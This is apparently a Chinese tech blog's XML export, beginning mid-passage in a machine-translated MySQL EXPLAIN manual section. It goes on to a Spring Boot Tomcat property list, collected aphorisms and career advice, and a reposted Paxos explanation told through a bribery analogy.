as`a`， &lt;in_optimizer&gt;（`test`.`t1`.`a``，`test`.``t1`.`a` in （&lt;materialize&gt;（/ *选择＃2 * /选择`test`.`t2`.`a` from`test`.`t2` where 1 has 1）， &lt;primary_index_lookup&gt;（`test`.```t1`.`a` in &lt;auto_key&gt;上的&lt;临时表&gt; where（（&apos;test`.`t1`.`a` =`materialized-subquery`.`a`）））））AS`t1.a IN（SELECT t2.a FROM t2）`from`test`.`t1`一排（0.00秒）由于显示的语句SHOW WARNINGS可能包含特殊标记以提供有关查询重写或优化程序操作的信息，因此该语句不一定是有效的SQL，并且不打算执行。输出还可能包含具有Message值的行， 以提供有关优化程序执行的操作的附加非SQL说明性注释。以下列表描述了可以显示在扩展输出中的特殊标记SHOW WARNINGS：&lt;auto_key&gt;一个临时表的自动生成的密钥。&lt;cache&gt;(expr)表达式（例如标量子查询）会执行一次，并将结果值保存在内存中供以后使用。对于由多个值组成的结果，可能会创建一个临时表，您将看到&lt;temporary table&gt;。&lt;exists&gt;(query fragment)子查询谓词转换为 EXISTS谓词，并且子查询被转换，以便它可以与EXISTS谓词一起使用 。&lt;in_optimizer&gt;(query fragment)这是一个没有用户意义的内部优化器对象。&lt;index_lookup&gt;(query fragment)使用索引查找处理查询片段以查找合格的行。&lt;if&gt;(condition, expr1, expr2)如果条件成立，则评估为 expr1否则 expr2。&lt;is_not_null_test&gt;(expr)验证表达式不评估的测试 NULL。&lt;materialize&gt;(query fragment)使用子查询实现。`materialized-subquery`.col_name对col_name内部临时表中的列的引用，具体化为 保留评估子查询的结果。&lt;primary_index_lookup&gt;(query fragment)使用主键查找处理查询片段以查找合格的行。&lt;ref_null_helper&gt;(expr)这是一个没有用户意义的内部优化器对象。/* select#N */ select_stmt该SELECT行与非扩展EXPLAIN输出中具有id值的 行相关联N。outer_tables semi join (inner_tables)半连接操作。 inner_tables显示没有拔出的表格。请参见第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。&lt;temporary table&gt;这表示为创建缓存中间结果而创建的内部临时表。当某些表是const 或system类型时，涉及这些表中的列的表达式由优化器提前评估，而不是显示的语句的一部分。但是，FORMAT=JSON有些 const表访问显示为ref使用const值的访问。 8.8.4获取命名连接的执行计划信息 1234567891011121314151617181920212223242526272829303132333435363738要获取在命名连接中执行的可解释语句的执行计划，请使用以下语句：EXPLAIN [ options]连接connection_id;EXPLAIN FOR CONNECTION返回EXPLAIN当前用于在给定连接中执行查询的信息。由于数据（和支持统计）的更改，它可能会产生与运行EXPLAIN等效查询文本不同的结果 。这种行为差异可用于诊断更多暂时性能问题。例如，如果您在一个需要很长时间才能完成的会话中运行语句，请使用EXPLAIN FOR CONNECTION在另一个会话中使用可能会产生有关延迟原因的有用信息。connection_id是从INFORMATION_SCHEMA PROCESSLIST表或者 SHOW PROCESSLIST语句中获得的连接标识符 。如果您有PROCESS权限，则可以为任何连接指定标识符。否则，您只能为自己的连接指定标识符。如果指定的连接未执行语句，则结果为空。否则，EXPLAIN FOR CONNECTION 仅适用于在指定连接中执行的语句是可解释的情况。这包括 SELECT， DELETE， INSERT， REPLACE，和 UPDATE。（但是， EXPLAIN FOR CONNECTION对于准备好的语句，即使是这些类型的准备语句也不起作用。）如果指定的连接正在执行可解释的语句，则输出是您将使用的内容 EXPLAIN在语句本身上内容。如果指定的连接正在执行不可解释的语句，则会发生错误。例如，您不能为当前会话命名连接标识符，因为 EXPLAIN无法解释：MySQL的&gt; SELECT CONNECTION_ID();+ ----------------- +| CONNECTION_ID（）|+ ----------------- +| 373 |+ ----------------- +一排（0.00秒）MySQL的&gt; EXPLAIN FOR CONNECTION 373;错误1889（HY000）：EXPLAIN FOR CONNECTION命令受支持仅适用于SELECT / UPDATE / INSERT / DELETE / REPLACE该Com_explain_other状态变量表示的数 EXPLAIN FOR CONNECTION执行的语句。 8.8.5估计查询性能 123456789101112131415161718192021在大多数情况下，您可以通过计算磁盘查找来估计查询性能。对于小型表格，通常可以在一次磁盘查找中找到一行（因为索引可能已被缓存）。对于更大的表格，您可以使用B-tree索引来估计，您需要这么多的查找来查找一行： log(row_count) / log(index_block_length / 3 * 2 / (index_length + data_pointer_length)) + 1。在MySQL中，索引块通常是1024个字节，数据指针通常是4个字节。对于密钥值长度为三个字节（大小MEDIUMINT）的500,000行表 ，公式指示 log(500,000)/log(1024/3*2/(3+4)) + 1= 4查找。这个索引需要大约500,000 * 7 * 3/2 = 5.2MB的存储空间（假设一个典型的索引缓冲区填充率为2/3），所以你可能在内存中有很多索引，所以只需要一两个调用读取数据以查找该行。然而，对于写操作，需要四个查找请求来查找放置新索引值的位置，通常需要两次查找来更新索引并写入行。上述讨论并不意味着您的应用程序性能会通过日志缓慢退化 N。只要所有东西都被操作系统或MySQL服务器缓存，随着表变大，事情变得稍微慢一些。数据变得太大而无法缓存后，事情开始变得缓慢，直到您的应用程序仅受磁盘查找（日志增加N）的约束 。为避免这种情况，请在数据增长时增加密钥缓存大小。对于MyISAM 表，键缓存大小由key_buffer_size系统变量控制 。请参见第5.1.1节“配置服务器”。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot 配置 内嵌 tomcat]]></title>
    <url>%2F2018%2F02%2F24%2Fspring-boot%2Fspringboot-tomcat%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#启动端口server. Port = xxxx#绑定ipserver. Address =#容器 uriserver. contextPath =#部署nameserver. displayName =#servlet 路径server. servletPath =#容器参数server. contextParameters =#转发headerserver. useForwardHeaders =#服务headerserver. serverHeader =#最大 header大小server. maxHttpHeaderSize =#最大 post 数据大小server. maxHttpPostSize =#连接超时时间server. connectionTimeout =#session 失效时间server. session.timeout =#模块跟踪server. session.trackingModes =server. session.persistent =#数据缓存目录【常见上传图片】server.session.storeDir =#cookie 名字 server.cookie. name =#域服务名字server.cookie. domain =#cookie 路径server.cookie. path =#cookie 备注server.cookie. comment =server.cookie. httpOnly =server.cookie. secure =server.cookie. maxAge =server. ssl. Enabled =server.ssl. clientAuth =server.ssl. ciphers =server.ssl. enabledProtocols =server.ssl. keyAlias =server.ssl. keyPassword =server.ssl. keyStore =server.ssl. keyStorePassword =server.ssl. keyStoreType =server.ssl. keyStoreProvider =server.ssl. trustStore =server.ssl. trustStorePassword =server.ssl. trustStoreType =server.ssl. trustStoreProvider =server.ssl. protocol =server.compression. enabled =server.compression.mimeTypes =server.compression.excludedUserAgents =server.compression.minResponseSize =server. jspServlet. className =server.jspServlet. initParameters =server.jspServlet.registered =server.tomcat.accesslog.enabled =server.tomcat.accesslog.pattern =server.tomcat.accesslog.directory =server.tomcat.accesslog.prefix =server.tomcat.accesslog.suffix =server.tomcat.accesslog.rotate =server.tomcat.accesslog.renameOnRotate =server.tomcat.accesslog.requestAttributesEnabled=server.tomcat.accesslog.buffered =server.tomcat.internalProxies =server.tomcat.protocolHeader =server.tomcat.protocolHeaderHttpsValue =server.tomcat.portHeader =server.tomcat.remoteIpHeader=server.tomcat.basedir =server.tomcat.backgroundProcessorDelay =server.tomcat.maxThreads =server.tomcat.minSpareThreads =server.tomcat.maxHttpPostSize =server.tomcat.maxHttpHeaderSize =server.tomcat.redirectContextRoot =server.tomcat.uriEncoding =server.tomcat.maxConnections =server.tomcat.acceptCount =server.tomcat.additionalTldSkipPatterns =]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[干了这一波毒鸡汤]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-3%2F</url>
    <content type="text"><![CDATA[1、怎么定义「想清楚了」？ “想清楚了”就是以后出了什么问题你只能找个没人的地方抽自己，再也不能抱怨别人了。 2、你交朋友的标准是什么？ 出世的智者，入世的强者，或者正常而阳光的普通人。 3、男性更看重女性的身材、脸蛋，还是思想？ 脸蛋和身材决定了我是否想去了解她的思想。 思想决定了我是否会一票否决掉她的脸蛋和身材。 4、「别让孩子输在起跑线上」有道理吗？ 一辈子都要和别人去比较，是人生悲剧的源头。 5、做哪些事情可以提升生活品质？ 定期扔東西。 6、结婚以后两个人在一起最重要的是什么？ 就当这婚还没结。 7、怎么判断乞丐的真假？ 乞丐無論真假，當他向你乞討時，他就真的是乞丐了。 8、为什么文章写出来是为了给别人看的，可是写作的时候却很讨厌旁边有人看？ 因为有了观察者之后，无限可能的状态就塌缩了。 9、怎么反驳「你行你上啊」的逻辑？ 天涯名句「我评论个电冰箱，自己还得会制冷啊？」 10、你最希望你年轻的时候本该知道哪些道理或者懂得哪些事情？ 内心的感受比外面的大道理重要。 11、把学费拿来念书还是环游世界更合适？为什么？ 读书在没有充分的知识做为前提的情况下，即使行了万里路也不过是邮差而已。 12、为什么部分人会产生「聪明智慧的姑娘都被憨憨的小伙儿搞定了」的印象？ 严肃地说，我觉得，要么姑娘只是看起来聪明，要么小伙儿只是看起来憨··· 13、你为什么进入媒体？你为什么至今依然留在媒体？ 我进媒体，是因为我不会干别的；我至今还留在媒体，是因为我还不会干别的。 14、你心中的完美爱情是怎么样的？ 可以有不完美。 15、对于爱情，放下的瞬间是什么样的？ “在离别的车站，她上了车，我没有像以往那样目送那班车到消失，而是头也不回的走向家的方向。” 16、你最深刻的错误认识是什么？ 以为自由就是想做啥做啥。后来才发现自律者才会有自由。 当一个人缺乏自律的时候，他做的事情总是在受习惯和即时诱惑的影响，要么就是被他人的思想观念所扰， 几乎永远不可能去做内心真正渴望的事。 17、为什么德国，这个贡献了如此多知识精英的国家，在国家决策上面如此愚蠢，卷入了两场打不赢的世界大战？ 上次看欧洲杯，一个朋友对德国做出了评价：用哲学忽悠别人，用科学发展自己。 18、女朋友是否无理取闹，要求太多？ 平淡其实是很奢侈的。 那意味着有许多爱你的人在为你而付出。 19、如何成为有想法的人？ 你们有没有发现，很有想法的人往往“厚脸皮”。 我是说：他们不害怕说出一个想法后，被人认为二逼。 有想法的人太多了，敢说出来的人太少了。 19、你为何下定决心离开某一公司？ 有种说法，看你想不想留在一个公司，只要看看你的同事们的生活，如果他们的生活不是你想要的， 就可以离开了，第一家公司离开的原因，就是我需要换一种生活 20、异国长期生活，改变了你的哪些「是非观」？ 很多事情只是不同，并无是非。 21、是不是一个人越成熟就越难爱上一个人？ 不是越成熟越难爱上一个人。 是越成熟，越能分辨那是不是爱。 22、如何让这个世界变得美好？ 把你自己变得更美好。 23、苦难有什么价值？ 永远不要相信苦难是值得的，苦难就是苦难，苦难不会带来成功。 苦难不值得追求，磨练意志是因为苦难无法躲开。 24、国外哪些事物让你感觉还不如呆在国内舒服？ “得到了天空，失去了大地”。 25、留欧与留美之间常会相互有哪些吐槽？ 在我们新加坡留学生看来，你们好歹都算是出过国了。 26、你打天下的方法论是怎样的？ 以正合以奇胜。 不向静中参妙理，纵然颖悟也虚浮。 27、怎么确定对方是能一辈子和我在一起的人？ 钱钟书先生对杨绛女士有这样一段评价，被社会学家视为理想婚姻的典范： 1、在遇到她以前，我从未想过结婚的事。 2、和她在一起这么多年，从未后悔过娶她做妻子。 3、也从未想过娶别的女人。 28、如何反驳「现实点，这个社会就是这样」？ &quot;你是怎样，你的世界就是怎样。&quot; 29、你对自由的理解是什么？ 说“不”的能力 30、有哪些产品体现了 less is more 的设计理念？ 围棋 31、如何区分善良和懦弱？ 面对敌人，有能力伤害别人，而不愿意伤害，谓之善良。 面对敌人，有能力伤害别人，不敢去伤害，谓之懦弱。 32、跟朋友聊天问问题被回你猜时该回复什么可以做到戳瞎双眼的效果呢？ 朋友：“你猜” 答：“猜完了” 朋友：“猜的啥？” 答：“你猜” 33、我们是否应该抵制日货？ 我们要抵制日货，并不是要砸自己的日货。我们应该在自己的各行各业都比它做得好。 我们的官员比他们的清廉，我们的街道比他们的干净，然后我们的桥也比它结实。 还有我们的年轻人，比他更有未来，更有希望。 34、为什么成功学书籍看多，不仅没起到多少励志的作用，反而带来了很多负面的影响？ 上士闻道，勤能行之；中士闻道，若存若亡；下士闻道，大笑之。 ——《老子》 35、怎么看待励志的书籍？ 看再多，那都是别人的人生。 36、同样是别人比自己强，为什么有时会产生嫉妒心理，而有时会产生崇拜？ 远的崇拜，近的嫉妒。 够不着的崇拜，够得着的嫉妒。 有利益冲突的嫉妒，没利益冲突的崇拜。 37、室友都是热衷于看韩剧看星座爱陆琪的女孩，我在她们面前总是有一种优越感，而且总想卖弄一番自己每天逛知乎学来的知识，我该怎么办？ 人之患在好为人师 38、有些人特别喜欢发很简短的状态，这是一种什么心理？ 可能性如下： 1.简为美。 2.不希望别人看懂，希望自己记录。 3.不希望别人看懂，希望某人看懂。 4.不希望别人看懂，希望别人关心。 5.装。 6.懒。 39、编程的乐趣是什么？ 人的成就感来源于两样东西，创造和毁灭。 40、为什么当看到好照片时人们通常的反应是“真不错，你用的是什么相机？”，当看到烂照片时，则往往笑话拍摄者水平很臭？ 人习惯性的将自己的成功归因于自身，失败归因于环境； 而将他人的成功归因于环境，失败归因于其自身。 41、怎样面对同事对你的指责？ 1. 你有错么？ 有错跳到4，没错跳到2 2. 他有病么？ 如果指责别人是他的癖好，跳到3，否则跳回1反思 3. 不管他，做好你自己的事 4. 知错就改，虚心接受 42、刚刚交往的男朋友郑重的跟我说：＂将来你能不能不要跟我说你的过去，我不想知道也不会问，我怕有心理阴影。你能答应我么？＂他是什么意思？ “和妹子相处，要义就是：若她涉世未深，就带她看尽人间繁华；若她心已沧桑，就带她坐旋转木马。” 只是，对男人来说若他心已沧桑，则只想安静的有个人一起生活！ 43、怎样有效提出推荐或建议同时，避免给人灌输和强迫的感觉？ 说服他人不要诉诸理性，应求于利益。 44、哪些技能，经较短时间的学习，就可以给人的生活带来巨大帮助？ 夸奖他人。 45、为什么很多程序员、Geek 都喜欢熬夜，而且在后半夜工作效率异常高？ 一个姑娘问我，搞学术的为什么都睡得那么晚，难道只有到晚上才有灵感？不是，姑娘，搞学术不靠灵感， 靠的是碌碌无为的白天引发的愧疚心。 46、你是如何走出人生的阴霾的？ 多走几步。 47、怎样做到“不抱怨”？ 自知者不怨人 知命者不怨天 48、如何开导一个内心阴暗的女孩？ 方法什么的不重要 最重要的是 一旦你决定走近她，就千万不要主动远离她 一旦她开始靠近你，就永远不要试图推开她 49、26岁，工作三年却将留学三年，值得吗？ 普通玩家选择标准配置，高端玩家选择自定义配置。 50、坚持看新闻联播真的能致富？ 看新闻联播的目的不是为了了解什么，学习什么，而是让你知道政府想让人们知道什么， 而在中国这样一个政府力量巨大的社会里，对政府意图更好的解读对于经商确实是非常有益的。 51、什么样的人活得最幸福？ 牌好、技术高且懂得悲天悯人之人。 52、为什么有些事对别人来说只是举手之劳可他们却不愿帮忙？ 部分人是因为不够爱这个世界和世界上的人。部分人是因为不够信任这个世界和世界上的人。 53、如何看待「年轻时就释怀与淡泊，是没有希望的」这句话？ 试图用一句话就来总结复杂的人生，是没有希望的。 54、如果没有月亮的话，人类文明会有何不同？ 没有人类。 55、如何征服全宇宙？ 征服自己。 56、能写出非常优秀的段子的赖宝为什么会得抑郁症？ 因为喜剧演员都是把自己当做了祭品奉献给观众 57、是否真的有天道酬勤？ 成功需要运气，天赋，背景，人脉等等。勤奋可能只是不起眼的一个条件。 但这并不意味着，如果你放弃勤奋，你就可以拥有其他条件。 对于大部分人来说，他们只能勤奋，别无选择。 世界本不公平，但不公平不是不努力的理由。 58、人这一生为什么要努力？ 最痛苦的事，不是失败，是我本可以 59、要怎样努力，才能成为很厉害的人？ 如果你注定要成为厉害的人，那问题的答案就深藏在你的血脉里；如果你注定不是厉害的人，那你便只需要做好你自己。 60、业余和专业最大的区别是什么？ 高手都是跟自己玩的，水货都是陪别人玩的。 61、在一个足够小的星球上行走，我们是在上坡还是下坡？ 你感觉累就是上坡，感觉轻松就是下坡。 62、你经历过的最神奇的事情是什么？ 我一同学，某天指灯发誓自己没说谎，结果刚说完，灯罩掉下来了，正砸头顶上。 63、前半生与后半生的分界线是在哪里？ 此时此刻 64、你遇到过哪些让你眼前一亮、醍醐灌顶或对你改变很大的理念？ 天赋决定了你能达到的上限，努力程度决定了你能达到的下限。以绝大多数人的努力程度之低，远远没有达到要去拼天赋的地步。 65、听过最落寞的一句话或诗句是什么？ 不如意事常八九，可与言者无二三。 66、世界上有那么多好书好电影好动漫注定看不完，我们对这个事实该持何种态度？ 怕什么真理无穷，进一寸有一寸的欢喜。——胡适 67、30 岁才开始学习编程靠谱吗？ 种一棵树最好的时间是十年前，其次是现在。————CaunDerre 68、怎么修身养性？ 年轻时就释怀与淡泊，是没有希望的。——王石 69、向喜欢的女生表白被拒绝了，还是喜欢她，怎么办？ 也许你弄错了什么是表白，表白应该是最终胜利时的号角，而不应该是发起进攻的冲锋号。————邵鸽 70、省钱的好办法有哪些？ 在买任何东西之前牢记九字箴言：你喜欢，你需要，你适合。 PS：适用于很多事，包括感情也一样————费妮妮 71、和不熟的女生去吃饭应该怎么聊？ 有人觉得交际困难或者比较累，是因为他们总是试图表现出自己所不具备的素质————秦春山 72、王阳明的「知行合一」到底如何理解？又怎样运用到实际生活中？ 知道做不到，等于不知道————星光居士 73、什么叫见过大世面？ 能享受最好的，能承受最坏的————张亮 74、科学和迷信的分界点是哪里？ 我错了————陳浩 75、当初 Android 刚火的时候，为什么 Nokia 不采用，却依旧钟情于塞班？ 人不会死在绝境。。却往往栽在十字路口————李楠 76、扎克伯格初期是怎么保护 Facebook 的最初创意？为什么 Facebook 上线后没被其他大公司抄走？ 保护创意的最好方法，就是将其最好地执行————黄继新 77、哪些行为容易得罪别人，自己却不容易察觉？ 太把别人当自己人。 78、怎样变得坦率和温柔？ 一想到大家总有天要死，就觉得该对喜欢的人好一点，就这样啊。 79、员工辞职最主要的原因是什么？ 钱少事多离家远，位低权轻责任重。 80、你在生活中得到过的最好的建议是什么？ “永远不要问你不想知道答案的问题” “过度自我关注是万恶之源” “永远不要为尚未发生的事儿拧巴。 恩宜自淡而浓，先浓后淡者，人忘其惠； 威宜自严而宽，先宽后严者，人怨其酷。 觉得为时已晚的时候，恰恰是最早的时候 81、热爱生活是什么样子的？ 每天都有很强大的起床的动力，用心去拥抱每个时刻，珍惜美好的人与物。 82、肥是什么感觉？ 肥就是人间失格。 83、有什么瞬间让你觉得世界真小？ 48个相亲对象，竟然40个认识，世界太小了。 84、哪些行为是浪费时间？ 思而不学+犹豫不决 85、最能燃起你学习激情的一句话是什么？ 你不能把这个世界，让给你所鄙视的人。 夏酷暑，冬严寒，春也不死吾心，心所向，将所成 86、和比自己家境富裕的人交友、来往（包括恋爱、同学、职场），需要注意什么？ 其实和任何人交往都是一个道理，如果做不到，要事先说，不要中途或者事后说。 87、「装逼」跟「选择自己想要」的分界线在哪里？ 牛逼和装逼的区别是，你究竟是对「做这件事」本身乐在其中，还是对「让其他人知道我做了这件事」乐在其中。 如果有一件事，就算做了也决不能向任何人提起，还会毫不犹豫去做的，那才叫「选择自己想要的」。 88、如果好人没好报，我们为什么还要做好人？ 我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的。——哈维尔 89、恋爱半年，女朋友觉得没有了开始时的新鲜感，怎么办？ 一直认为，所谓新鲜感，不是和未知的人一起去做同样的事情， 而是和已知的人一起去体验未知的人生。 90、女生怎么看待自己心目中的「男神」的？ 谁能凭爱意要富士山私有。 91、为什么大家都要上大学找工作，而不太喜欢开出租车、开小店、开饭馆、摆街边早餐小吃摊等“短平快”项目？ “孩子，我要求你读书用功，不是因为我要你跟别人比成绩，而是因为，我希望你将来会拥有选择的权利， 选择有意义、有时间的工作，而不是被迫谋生。当你的工作在你心中有意义，你就有成就感。 当你的工作给你时间，不剥夺你的生活，你就有尊严。成就感和尊严，给你快乐。”----龙应台 92、情商不高的例子有哪些？ 对陌生人毕恭毕敬 对亲近的人随意发怒…… 93、好人是如何变成坏人的？ 他觉得不公平的时候。 94、如何看待「年轻的时候需要的是朋友而不是人脉」？ 沒有目的之交往，才能感動人。 95、如何解读“伊能静宣布收小贩夏俊峰之子为义子与其妻结拜”？ 所有利他行为都应该被鼓励，即使布施者最后也得利。 96、理工科人士如果在相关知识和背景了解不多的情况下以肯定性的语气跨界讨论社科类问题，是否与科学精神相悖？ 一千个人眼里有一千个哈姆雷特，但这个世界上只有一个勾股定理。 97、有哪些道理是你读了不信，听不进去，直到你亲身经历方笃信不疑的？ 不要低估你的能力，不要高估你的毅力 98、为什么周围有的女生嘴里喊着男女平等，但是到了很多事上又会理所当然的享受女生特权？ 因为任何个人或团体都不会主动放弃既得利益或优势。 99、怎样才可以当学霸？ 没有学到死，就往死里学。 100、如何把无聊变为有趣？ 须知才高于志，方是快乐的本源。以苍鹰搏兔之势逮耗子，架起导弹高射炮来打蚊子，越是「大材小用」，越有喜剧效果。 越是用一本正经的态度，去做无聊的事情，越能悦人悦己。反正闲着也是闲着，不为无益之事，何以遣有涯之生呢。 101、为什么有些事对别人来说只是举手之劳可他们却不愿帮忙？ 我去做一件事并不是因为它简单，而是因为它值得。 102、有哪些我们熟知的名言其实还有后半句？ 「人是生而自由的」 下一句是： 「但无往不在枷锁之中。」 再下一句是： 「自以为是其他一切主人的人，反而比其他一切更是奴隶。」 转载地址 欢迎评论留言感触最深的几句话]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试时候看一下 系列]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-6%2F</url>
    <content type="text"><![CDATA[职场宫心计之面试遇到“你有什么要问我的吗”，该如何回答？]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转知乎关于工作]]></title>
    <url>%2F2017%2F08%2F20%2Fessay%2Fessay-5%2F</url>
    <content type="text"><![CDATA[1、领导就是领导，无论你们年纪多么相近，无论你们之前多么相熟，在他是你的领导的时候，请你保持对领导的尊重，这也包括，你并不能把所有的想法都告诉他。 2、积极主动、落落大方。只要是同事，不论是什么部门的，你们能遇见，有说话的机会 ，比如一起在食堂吃饭、在会上遇见，请你积极主动和别人打招呼，并且保留联系方式。 3、对于你认可而你领导不认可的意见，请你保留，直到你当上领导的那一天。 4、全面了解公司架构，并寻找自己的扩展机会。这不是让你换岗位，而是对外讲得清自己公司的架构，对内如果有主动或者被动的调整机会，你知道自己想去哪儿。 5、积累、寻找上升机会。尤其是你怀才不遇的时候，如果你真的有“才”，只有你有话语权的时候，你才有更大的发展可能。 6、保持平常心，顺势而为。做积极主动的努力，但并不执着于结果。很多职业上的发展是能力、机遇、人脉等各种综合作用的结果，并不被单一因素所决定。所以如果做了努力，但没有结果，不要灰心。付出不会浪费，可以寻找别的机会，也可以等待机会。 7、自己的成长才是最重要的。除了薪水、职位，在你发展过程中，不论在哪个单位的哪个进程中，都要不断成长，或者说拿到你想拿到的东西再离开。 8、当你想换工作，又有一份你愿意尝试的工作愿意接受你的时候，不要太过犹豫自己是不是换工作换的太频繁，别人如何想。只要你进行过基本的分析，不会比现在差，就鼓励你尝试。尝试有50%的可能变好。要相信，时间是一张网，撒在哪里都会有收获。 9、善于发挥自己的优势。如果你学历高，建议你去一个学历门槛比较重的单位，当然只是建议，依次类推。 10、不断学习。英语啊、各种证书啊，等等，在不耽误工作的基础上，学习和拿下工作不断推进。 原文地址]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在线随机密码生成工具]]></title>
    <url>%2F2017%2F07%2F13%2Fencryption%2Fpassword-created%2F</url>
    <content type="text"><![CDATA[本站保证不收集任何生成密码、且全站使用https加密、请放心使用生成的密码 密码位数： （建议设置在10-50之间） 大写字母 小写字母 数字 特殊字符 生成密码 觉得不错就收藏下喽~~]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[paxos【转】]]></title>
    <url>%2F2017%2F07%2F08%2Falgorithm%2Fpaxos%2F</url>
    <content type="text"><![CDATA[wiki-paxos zk 原理 watcher 监听 paxos转载地址：http://www.cnblogs.com/endsock/p/3480093.html123456789101112131415161718192021在paxos算法中，分为4种角色： Proposer ：提议者 Acceptor：决策者 Client：产生议题者 Learner：最终决策学习者上面4种角色中，提议者和决策者是很重要的，其他的2个角色在整个算法中应该算做打酱油的，Proposer就像Client的使者，由Proposer使者拿着Client的议题去向Acceptor提议，让Acceptor来决策。这里上面出现了个新名词：最终决策。现在来系统的介绍一下paxos算法中所有的行为： 1、Proposer提出议题 2、Acceptor初步接受 或者 Acceptor初步不接受 3、如果上一步Acceptor初步接受则Proposer再次向Acceptor确认是否最终接受 4、Acceptor 最终接受 或者Acceptor 最终不接受 5、上面Learner最终学习的目标是Acceptor们最终接受了什么议题？注意，这里是向所有Acceptor学习， 6、如果有多数派个Acceptor最终接受了某提议，那就得到了最终的结果，算法的目的就达到了。 画一幅图来更加直观： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 为什么需要3个Acceptor？因为Acceptor必须是最少大于等于3个，并且必须是奇数个， 因为要形成多数派嘛，如果是偶数个，比如4个，2个接受2个不接受，各执己见，没法搞下去了。 为什么是3个Proposer？ 其实无所谓是多少个了，1~n 都可以的；如果是1个proposer，毫无竞争压力，很顺利的完成2阶段提交， Acceptor们最终批准了事。如果是多个proposer就比较复杂了，请继续看。 上面的图中是画了很多节点的，每个节点需要一台机器么？答案是不需要的，上面的图是逻辑图， 物理中，可以将Acceptor和Proposer以及Client放到一台机器上，只是使用了不同的端口号罢了， Acceptor们启动不同端口的TCP监听，Proposer来主动连接即可； 完全可以将Client、Proposer、Acceptor、Learner合并到一个程序里面；这里举一个例子： 比如开发一个JOB程序，JOB程序部署在多台服务器上(数量为奇数)，这些JOB有可能同时处理一项任务， 现在使用paxos算法让这些JOB自己来商量由谁(哪台机器)来处理这项任务，这样JOB程序里就需要包含Client、 Proposer、Acceptor、Learner这4大功能，并且需要配置其他JOB服务器的IP地址。再举一个例子，zookeeper常常用来做分布式事务锁。Zookeeper所使用的zad协议也是类似paxos协议的。 所有分布式自协商一致性算法都是paxos算法的简化或者变种。 Client是使用zookeeper服务的机器，Zookeeper自身包含了Acceptor, Proposer, Learner。 Zookeeper领导选举就是paxos过程，还有Client对Zookeeper写Znode时，也是要进行Paxos过程的， 因为不同Client可能连接不同的Zookeeper服务器来写Znode，到底哪个Client才能写成功？ 需要依靠Zookeeper的paxos保证一致性，写成功Znode的Client自然就是被最终接受了， Znode包含了写入Client的IP与端口，其他的Client也可以读取到这个Znode来进行Learner。 也就是说在Zookeeper自身包含了Learner(因为Zookeeper为了保证自身的一致性而会进行领导选举， 所以需要有Learner的内部机制，多个Zookeeper服务器之间需要知道现在谁是领导了)， Client端也可以Learner，Learner是广义的。 现在通过一则故事来学习paxos的算法的流程(2阶段提交)，有2个Client(老板，老板之间是竞争关系)和3个Acceptor(政府官员)：现在需要对一项议题来进行paxos过程，议题是“A项目我要中标！”，这里的“我”指每个带着他的秘书Proposer的Client老板。 Proposer当然听老板的话了，赶紧带着议题和现金去找Acceptor政府官员。 作为政府官员，当然想谁给的钱多就把项目给谁。 Proposer-1小姐带着现金同时找到了Acceptor-1~Acceptor-3官员，1与2号官员分别收取了10比特币，找到第3号官员时， 没想到遭到了3号官员的鄙视，3号官员告诉她，Proposer-2给了11比特币。 不过没关系，Proposer-1已经得到了1,2两个官员的认可，形成了多数派(如果没有形成多数派， Proposer-1会去银行提款在来找官员们给每人20比特币，这个过程一直重复每次+10比特币，直到多数派的形成)， 满意的找老板复命去了，但是此时Proposer-2保镖找到了1,2号官员，分别给了他们11比特币， 1,2号官员的态度立刻转变，都说Proposer-2的老板懂事，这下子Proposer-2放心了，搞定了3个官员， 找老板复命去了，当然这个过程是第一阶段提交，只是官员们初步接受贿赂而已。 故事中的比特币是编号，议题是value。 这个过程保证了在某一时刻，某一个proposer的议题会形成一个多数派进行初步支持； ===============华丽的分割线，第一阶段结束================ 5. 现在进入第二阶段提交，现在proposer-1小姐使用分身术(多线程并发)分了3个自己分别去找3位官员， 最先找到了1号官员签合同，遭到了1号官员的鄙视，1号官员告诉他proposer-2先生给了他11比特币， 因为上一条规则的性质proposer-1小姐知道proposer-2第一阶段在她之后又形成了多数派(至少有2位官员的赃款被更新了); 此时她赶紧去提款准备重新贿赂这3个官员(重新进入第一阶段)，每人20比特币。 刚给1号官员20比特币， 1号官员很高兴初步接受了议题，还没来得及见到2,3号官员的时候 这时proposer-2先生也使用分身术分别找3位官员(注意这里是proposer-2的第二阶段)，被第1号官员拒绝了告诉他收到了20比特币， 第2,3号官员顺利签了合同，这时2，3号官员记录client-2老板用了11比特币中标，因为形成了多数派， 所以最终接受了Client2老板中标这个议题，对于proposer-2先生已经出色的完成了工作； 这时proposer-1小姐找到了2号官员，官员告诉她合同已经签了，将合同给她看，proposer-1小姐是一个没有什么职业操守的聪明人， 觉得跟Client1老板混没什么前途，所以将自己的议题修改为“Client2老板中标”，并且给了2号官员20比特币，这样形成了一个多数派。 顺利的再次进入第二阶段。由于此时没有人竞争了，顺利的找3位官员签合同，3位官员看到议题与上次一次的合同是一致的， 所以最终接受了，形成了多数派，proposer-1小姐跳槽到Client2老板的公司去了。===============华丽的分割线，第二阶段结束=============== Paxos过程结束了，这样，一致性得到了保证，算法运行到最后所有的proposer都投“client2中标”所有的acceptor都接受这个议题， 